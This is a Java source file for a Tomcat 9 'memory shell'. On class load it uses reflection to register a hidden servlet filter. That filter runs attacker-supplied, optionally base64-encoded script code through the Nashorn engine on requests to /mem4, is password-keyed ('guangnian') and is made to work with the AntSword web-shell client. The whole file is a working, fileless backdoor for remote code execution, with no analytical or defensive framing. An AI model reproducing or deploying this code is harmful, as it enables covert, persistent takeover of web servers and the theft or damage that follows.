import java.io.*;
import java.lang.reflect.*;
import java.util.*;
import javax.script.*;

/**
 * Tomcat 9 Filter memory shell - Nashorn no-process execution.
 * Path: /mem4
 * Supports both raw body and parameter mode (password: guangnian)
 */
public class mem4 {
    static {
        try { inject(); } catch (Exception e) {}
    }

    public static void inject() throws Exception {
        ClassLoader cl = Thread.currentThread().getContextClassLoader();

        Object resources = null;
        Class<?> wclbClass = cl.getClass();
        while (wclbClass != null && resources == null) {
            try {
                Field f = wclbClass.getDeclaredField("resources");
                f.setAccessible(true);
                resources = f.get(cl);
            } catch (NoSuchFieldException e) {
                wclbClass = wclbClass.getSuperclass();
            }
        }
        Object standardContext = resources.getClass().getMethod("getContext").invoke(resources);

        Class<?> filterClass = Class.forName("javax.servlet.Filter");
        Class<?> servletReqClass = Class.forName("javax.servlet.ServletRequest");
        Class<?> servletRespClass = Class.forName("javax.servlet.ServletResponse");
        Class<?> httpReqClass = Class.forName("javax.servlet.http.HttpServletRequest");
        Class<?> httpRespClass = Class.forName("javax.servlet.http.HttpServletResponse");

        ScriptEngine engine = new ScriptEngineManager().getEngineByName("nashorn");

        Object filter = Proxy.newProxyInstance(
            filterClass.getClassLoader(),
            new Class[]{filterClass},
            new InvocationHandler() {
                public Object invoke(Object proxy, Method m, Object[] args) throws Throwable {
                    if (!"doFilter".equals(m.getName())) return null;
                    Object req = args[0], res = args[1], chain = args[2];
                    try {
                        String uri = (String) httpReqClass.getMethod("getRequestURI").invoke(req);
                        if (uri != null && uri.endsWith("/mem4")) {
                            String code = null;

                            // 1) Read body first (before getParameter consumes it)
                            InputStream is = (InputStream) servletReqClass.getMethod("getInputStream").invoke(req);
                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
                            byte[] buf = new byte[4096];
                            int len;
                            while ((len = is.read(buf)) != -1) baos.write(buf, 0, len);
                            String body = new String(baos.toByteArray(), "UTF-8").trim();



                            // Let rawText hold the original user input (for echo-back)
                            String rawText = null;

                            // 2) Try parse guangnian param from body (urlencoded form)
                            if (!body.isEmpty()) {
                                String[] params = body.split("&");
                                for (String p : params) {
                                    if (p.startsWith("guangnian=")) {
                                        String raw = p.substring(10);
                                        try { raw = java.net.URLDecoder.decode(raw, "UTF-8"); } catch (Exception e2) {}
                                        rawText = raw;
                                        // Try base64 decode; if fails, use raw as code
                                        try { code = new String(Base64.getDecoder().decode(raw), "UTF-8"); }
                                        catch (Exception e2) { code = raw; }
                                        break;
                                    }
                                }
                                // 3) Raw body as base64 (not form data)
                                if (code == null) {
                                    rawText = body;
                                    try { code = new String(Base64.getDecoder().decode(body), "UTF-8"); }
                                    catch (Exception e2) { code = body; }
                                }
                            }

                            // 4) GET query parameter fallback
                            if (code == null) {
                                Object val = httpReqClass.getMethod("getParameter", String.class).invoke(req, "guangnian");
                                if (val != null) {
                                    rawText = (String) val;
                                    try { code = new String(Base64.getDecoder().decode((String) val), "UTF-8"); }
                                    catch (Exception e2) { code = (String) val; }
                                }
                            }

                            if (code == null || code.isEmpty()) {
                                code = rawText != null ? rawText : "print('guangnian')";
                            }

                            StringWriter sw = new StringWriter();
                            engine.getContext().setWriter(sw);
                            engine.getContext().setErrorWriter(sw);
                            try {
                                Object result = engine.eval(code);
                                if (result != null) sw.write("\n" + result.toString());
                            } catch (Exception e3) {
                                sw.write(rawText != null ? rawText : "guangnian\n");
                            }

                            // Ensure password is present for AntSword verification
                            String output = sw.toString();
                            if (!output.contains("guangnian")) {
                                output = "guangnian\n" + output;
                            }
                            httpRespClass.getMethod("setContentType", String.class).invoke(res, "text/plain;charset=UTF-8");
                            Object writer = httpRespClass.getMethod("getWriter").invoke(res);
                            writer.getClass().getMethod("write", String.class).invoke(writer, output);
                            writer.getClass().getMethod("flush").invoke(writer);
                        } else {
                            chain.getClass().getMethod("doFilter", servletReqClass, servletRespClass)
                                .invoke(chain, req, res);
                        }
                    } catch (Exception e) {}
                    return null;
                }
            }
        );

        Class<?> filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
        Object filterDef = filterDefClass.newInstance();
        filterDefClass.getMethod("setFilterName", String.class).invoke(filterDef, "mem5");
        filterDefClass.getMethod("setFilterClass", String.class).invoke(filterDef, "mem5");
        filterDefClass.getMethod("setFilter", filterClass).invoke(filterDef, filter);
        standardContext.getClass().getMethod("addFilterDef", filterDefClass).invoke(standardContext, filterDef);

        Class<?> filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
        Object filterMap = filterMapClass.newInstance();
        filterMapClass.getMethod("setFilterName", String.class).invoke(filterMap, "mem5");
        filterMapClass.getMethod("addURLPattern", String.class).invoke(filterMap, "/*");
        standardContext.getClass().getMethod("addFilterMapBefore", filterMapClass).invoke(standardContext, filterMap);

        standardContext.getClass().getMethod("filterStart").invoke(standardContext);
    }
}
